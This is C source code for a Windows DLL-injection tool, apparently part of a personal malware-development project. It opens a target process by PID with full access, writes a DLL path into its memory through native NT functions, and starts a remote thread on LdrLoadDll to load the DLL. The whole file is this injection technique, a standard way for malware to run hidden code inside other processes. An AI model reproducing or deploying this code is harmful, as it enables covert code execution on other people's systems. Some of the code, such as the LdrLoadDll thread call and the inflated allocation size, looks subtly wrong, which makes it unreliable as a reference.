#include <windows.h>
#include <stdio.h>
#include "defenitions.h"

HMODULE GetMod(
    IN LPCWSTR modName
  ) {
    HMODULE hModule = NULL;
  
    info("Trying to get a handle to %S", modName);
    hModule = GetModuleHandleW(modName);
  
    if (hModule == NULL) {
      warn("Failed to get a handle to the module, error 0x%lx\n", GetLastError());
      return NULL;
    }
  
    else {
      okay("got a handle to the module!");
      info("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
      return hModule;
    }
  
  }

DWORD PID, TID, waitResult = NULL;
NTSTATUS STATUS = NULL;
PVOID rBuffer, rMemory = NULL;
HMODULE hKernel32 = NULL;
HANDLE hNTDLL = NULL;
HANDLE hProcess, hThread = NULL;
UNICODE_STRING uString;

wchar_t dllPath[MAX_PATH] = L"C:\\Users\\AvaLi\\Documents\\programming\\Maldev\\Winjection-NativeAPI\\Winjection-NativeAPI\\DLLInjection\\build\\ALB.dll";
size_t dllPathSize = sizeof(dllPath);

int main(int argc, char* argv[]) {
    if (argc < 2) {
        warn("Incorrect usage.\n%s [PID]\n\t\\___Process ID to Inject to.", argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    hNTDLL = GetMod(L"NTDLL"); // Get a handle to native API to be used.

    OBJECT_ATTRIBUTES OA = {sizeof(OA), NULL};
    CLIENT_ID CID = {(HANDLE)PID, NULL};

    info("Populating NT Functions...");
    NtOpenProcess SpyOpenProcess = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    NtAllocateVirtualMemoryEx SpyAllocateVirtualMemoryEx = (NtAllocateVirtualMemoryEx)GetProcAddress(hNTDLL, "NtAllocateVirtualMemoryEx");
    NtClose SpyClose = (NtClose)GetProcAddress(hNTDLL, "NtClose");
    NtWriteVirtualMemory SpyWriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
    LdrLoadDll SpyLoadDLL = (LdrLoadDll)GetProcAddress(hNTDLL, "LdrLoadDll");
    NtCreateThreadEx SpyCreateRemoteThreadEx = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    PRtlInitUnicodeString spyInitUnicodeString = (PRtlInitUnicodeString)GetProcAddress(hNTDLL, "RtlInitUnicodeString");
    okay("Complete, beginning injection.");


    /* TRY TO GET A HANDLE TO THE PROCESS WE WANT TO INJECT TO. */
    info("Trying to get a handle to the process (%ld)", PID);
    STATUS = SpyOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
    if(STATUS != STATUS_SUCCESS) {
        warn("[NtOpenProcess] failed to get a handle on the process, error: 0x%lx", STATUS);
        goto CLEANUP;
    }
    okay("Got a handle on the process! (%ld)", PID);
    info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);
    
    /* FIND SIZE OF THE UNICODE_STRING PATH TO BE INJECTED. */
    info("Populating unicode string with DLL path...");
    spyInitUnicodeString(&uString, dllPath);
    if(&uString == NULL){
        warn("Failed to initialise unicode string with path to DLL. Error: 0x%lx", GetLastError());
    }
    info("Finding the size of the dll path to be injected...");
    SIZE_T stringLength = (wcslen(dllPath) + 1) * sizeof(WCHAR); // +1 for null terminator
    SIZE_T totalSize = (sizeof(UNICODE_STRING) + stringLength) * 500;
    okay("UNICODE_STRING fully populated and sized.");

    /* ALLOCATE MEMORY TO THE PROCESS WE JUST GRABBED THE HANDLE OF. */
    info("Attempting to allocate to process memory...");
    rMemory = VirtualAllocEx(hProcess, NULL, totalSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if(rMemory == NULL) {
        warn("[AllocateVirtualMemoryEx] failed, Error: 0x%lx", GetLastError());
        goto CLEANUP;
    }
    okay("Allocated buffer to process memory with PAGE_READWRITE permissions at 0x%p", rMemory);
    SpyWriteVirtualMemory(hProcess, rMemory, &uString, sizeof(UNICODE_STRING), NULL);
    SpyWriteVirtualMemory(hProcess, (PBYTE)rMemory + sizeof(UNICODE_STRING), dllPath, stringLength, NULL);

    rBuffer = (PBYTE)rMemory + sizeof(UNICODE_STRING);
    SpyWriteVirtualMemory(hProcess, (PBYTE)rMemory + offsetof(UNICODE_STRING, Buffer), &rBuffer, sizeof(PVOID), NULL);

    okay("Wrote UNICODE_STRING to process memory", dllPath);

    /* Allocate and write DLL path into memory for later use*/

    STATUS = SpyCreateRemoteThreadEx(
        &hThread,                        // Thread Handle To Write To
        THREAD_ALL_ACCESS,              // Full Thread Access
        NULL,                           // No object attributes
        hProcess,
        SpyLoadDLL,
        rMemory,
        0,
        0,
        0,
        0,
        NULL
    );
    // okay("%s Got a handle to the newly-created thread\n\\___[ hThread\n\t\\_0x%p]\n", hThread);
    info("Waiting for the thread to finish execution...");

    waitResult = WaitForSingleObject(hThread, INFINITE);
    if (waitResult == WAIT_FAILED) {
        warn("Failed to wait for thread completion. Error: 0x%lx", GetLastError());
    } else {
        okay("Thread completed successfully.");
    }
    goto CLEANUP;

CLEANUP:
    if (hThread) {
        SpyClose(hThread);
        info("Closed handle on thread.");
    }

    if (hProcess) {
        SpyClose(hProcess);
        info("Closed handle on process.");
    }

    okay("Cleanup complete!");
    return EXIT_SUCCESS;
}